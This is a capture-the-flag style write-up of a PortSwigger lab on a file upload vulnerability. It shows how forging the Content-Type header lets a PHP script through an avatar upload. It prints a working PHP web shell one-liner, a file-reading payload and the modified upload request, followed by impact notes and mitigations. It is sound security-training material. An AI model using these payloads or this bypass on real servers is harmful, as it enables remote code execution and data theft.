# Web Shell Upload via Content-Type Restriction Bypass

## 📌 Lab Overview

This lab demonstrates a **File Upload Vulnerability** caused by relying solely on the uploaded file's **Content-Type** header for validation.

The application attempted to restrict uploads to image files only:

```text
image/jpeg
image/png
```

However, the server trusted the client-supplied Content-Type header and failed to validate the actual file contents or extension securely.

By modifying the Content-Type header, it was possible to upload a malicious PHP web shell and achieve remote code execution.

This lab focused on:

- File Upload Vulnerabilities
- Content-Type Validation Bypass
- Web Shell Uploads
- Remote Code Execution (RCE)
- Burp Suite Request Manipulation

---

# 🔍 What is a File Upload Vulnerability?

A File Upload Vulnerability occurs when a web application allows users to upload files without properly validating them.

Applications often allow uploads for:

- profile pictures
- documents
- resumes
- media files

If file validation is weak, attackers may upload:

```text
.php
.jsp
.asp
.aspx
```

files that execute server-side code.

Example:

```php
<?php system($_GET['cmd']); ?>
```

If executed by the server, the attacker gains remote code execution.

---

# ⚠ Why Was the Application Vulnerable?

The application attempted to verify uploads using:

```http
Content-Type
```

headers only.

Example:

```http
Content-Type: image/png
```

However:

```text
Content-Type headers are controlled by the client.
```

An attacker can simply change:

```http
Content-Type: application/x-php
```

to:

```http
Content-Type: image/png
```

even though the file is still a PHP script.

As a result:

```text
Malicious File
↓
Accepted as Image
↓
Stored on Server
↓
Executed by Web Server
```

---

# 🎯 Objective

The goal of this lab was to:

- bypass Content-Type validation
- upload a malicious PHP file
- execute server-side code
- retrieve Carlos's secret
- solve the lab

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Normal Webpage

![Screenshot 1](screenshot-fileupload1.png)

The application initially displayed:

- a normal webpage
- a **My Account** button

---

## Screenshot 2 — Login Page

![Screenshot 2](screenshot-fileupload2.png)

After clicking **My Account**, I landed on the login page.

The lab provided valid credentials:

```text
Username: wiener
Password: peter
```

I entered the credentials and logged in.

---

## Screenshot 3 — Upload Functionality

![Screenshot 3](screenshot-fileupload3.png)

After logging in as:

```text
wiener
```

I could see:

- Update Email functionality
- Avatar Upload functionality

I selected:

```text
luffy.jpg
```

and uploaded it.

---

## Screenshot 4 — Successful Image Upload

![Screenshot 4](screenshot-fileupload4.png)

The application responded:

```text
The file avatars/luffy.jpg has been uploaded.
```

indicating that image uploads were allowed.

---

## Screenshot 5 — Upload Verification

![Screenshot 5](screenshot-fileupload5.png)

Returning to the account page confirmed that:

```text
luffy.jpg
```

was successfully displayed as the profile avatar.

I then attempted to upload a PHP file:

```text
virus.php
```

containing:

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

---

## Screenshot 6 — Upload Rejected

![Screenshot 6](screenshot-fileupload6.png)

The application blocked the upload and displayed:

```text
Sorry, file type application/x-php is not allowed.
Only image/jpeg and image/png are allowed.
```

This revealed that the validation relied on:

```http
Content-Type
```

checking.

---

## Screenshot 7 — Capturing the Upload Request

![Screenshot 7](screenshot-fileupload7.png)

I intercepted the upload request:

```http
POST /my-account/avatar
```

The uploaded file appeared as:

```http
Content-Disposition: form-data; name="avatar"; filename="virus.php"

Content-Type: application/x-php
```

The server was identifying the file as PHP based on the Content-Type header.

---

## Screenshot 8 — Bypassing Content-Type Validation

![Screenshot 8](screenshot-fileupload8.png)

Using Burp Repeater, I modified:

```http
Content-Type: application/x-php
```

to:

```http
Content-Type: image/png
```

while keeping the file itself unchanged:

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

After sending the request, the server responded:

```text
The file avatars/virus.php has been uploaded.
```

The bypass was successful.

---

# 🔍 Why Did This Work?

The application trusted:

```http
Content-Type: image/png
```

instead of verifying:

- file extension
- magic bytes
- file contents

The upload process became:

```text
PHP File
↓
Fake image/png Header
↓
Validation Passed
↓
Stored on Server
```

The file remained a PHP script despite pretending to be an image.

---

## Screenshot 9 — Executing the Web Shell

![Screenshot 9](screenshot-fileupload9.png)

After the upload, I navigated directly to:

```text
/files/avatars/virus.php
```

Example:

```text
https://LAB-ID.web-security-academy.net/files/avatars/virus.php
```

The server executed the PHP file and returned Carlos's secret:

```text
9DyVRkvYdY2kwtLMgmoovdS2RYPSgInm
```

---

## Screenshot 10 — Solving the Lab

![Screenshot 10](screenshot-fileupload10.png)

I copied the retrieved secret and submitted it through the lab solution box.

The lab was successfully solved.

---

# ⚠ Why This Vulnerability Exists

The vulnerability existed because the application trusted:

```http
Content-Type
```

headers supplied by the client.

Since attackers fully control request headers, they can easily forge:

```http
Content-Type: image/png
```

while uploading malicious code.

The server therefore accepted dangerous files as legitimate uploads.

---

# 💥 Impact

An attacker could potentially:

- upload web shells
- execute arbitrary server-side code
- access sensitive files
- steal application secrets
- compromise user accounts
- gain full server compromise

In real-world environments this often leads to:

```text
Remote Code Execution (RCE)
```

which is considered a critical vulnerability.

---

# 🛡 Mitigation

To prevent this issue:

- validate file extensions
- validate file signatures (magic bytes)
- verify actual file contents
- rename uploaded files
- store uploads outside the web root
- disable script execution in upload directories
- implement allowlists for safe file types
- perform server-side validation only

Never trust:

```http
Content-Type
```

headers provided by users.

---

# 🧠 Skills Learned

- File Upload Testing
- Content-Type Validation Bypass
- PHP Web Shell Uploads
- Remote Code Execution
- Burp Repeater Usage
- Server-Side File Validation Analysis

---

# 🧰 Tools Used

- Burp Suite
- Burp Repeater
- Browser Developer Tools
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how relying solely on the **Content-Type** header for file validation can lead to a critical file upload vulnerability.

By intercepting the upload request, modifying the Content-Type header, and disguising a PHP script as an image, I successfully uploaded a malicious web shell. Once uploaded, the server executed the PHP file and exposed Carlos's secret.

Through this lab, I learned:

- how Content-Type validation works
- why client-side metadata should never be trusted
- how web shell uploads lead to remote code execution
- how to exploit weak file upload implementations

The lab was successfully solved by bypassing Content-Type restrictions and executing a PHP web shell on the server.
